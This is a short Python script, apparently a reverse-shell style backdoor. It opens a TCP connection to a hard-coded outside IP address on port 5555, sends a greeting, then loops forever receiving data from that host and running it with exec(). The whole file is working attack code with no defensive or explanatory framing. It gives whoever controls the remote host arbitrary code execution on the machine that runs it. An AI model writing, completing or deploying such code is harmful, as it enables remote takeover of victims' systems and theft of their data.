import socket
import os

host = "80.123.42.170"
port = 5555

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
s.connect((host, port))

s.send(b'Hello')

while True:
    
    rawdata = s.recv(1024)
    exec(rawdata)